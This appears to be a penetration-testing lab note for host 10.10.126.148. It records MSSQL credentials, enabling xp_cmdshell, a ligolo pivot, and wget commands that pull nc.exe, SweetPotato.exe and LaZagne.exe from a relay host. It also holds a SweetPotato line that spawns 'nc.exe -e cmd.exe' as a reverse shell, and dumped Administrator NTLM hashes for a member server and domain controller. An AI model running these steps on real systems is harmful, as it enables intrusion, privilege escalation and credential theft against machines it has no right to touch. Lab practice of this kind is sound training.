### ++ Approach 10.10.126.148 ++
#### Credentials
	* sql_svc:Dolphin1 (MSSQL)

#### Services
	##### 135 RPC
		- 

	##### 139,445 SMB
		-

	##### 1433 MSSQL
		Command to connect: 
            impacket-mssqlclient sql_svc@10.10.126.148 -windows-auth

### ++ Vulnerabilities ++

#### Vuln 1: ++
	* -

### ++ System Interaction ++
#### Foothold
	* Connecting with sql_svc to mssql we can enable xp_cmdshell an execute commands
    * If we try to get a rev shell we can't achieve it because this server hasn't direct connection to our kali machine, so we have to setup this through ligolo
        listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234
    * Now we can send our rev shell pointing to our bridge server (the one from we are pivoting, but using the same net IP - 10.10.126.147)

#### Privilege Escalation 
	* We can abuse SeImpersonatePrivilege, moving the binaries through python server in port 1234 (as we setup before to establish a connection)
        wget -OutFile nc.exe 10.10.126.147:1234/nc.exe
        wget -OutFile SweetPotato.exe 10.10.126.147:1234/SweetPotato.exe
        .\SweetPotato.exe -a "C:\tools\nc.exe -e cmd.exe 10.10.126.147 1234
	
#### Post-exploitation 
	* LaZagne:
        powershell wget -OutFile LaZagne.exe 10.10.126.147:1234/LaZagne.exe

        Administrator:507e8b20766f720619e9f33d73756b34 (MS02)
        Administrator:59b280ba707d22e3ef0aa587fc29ffe5 (DC)
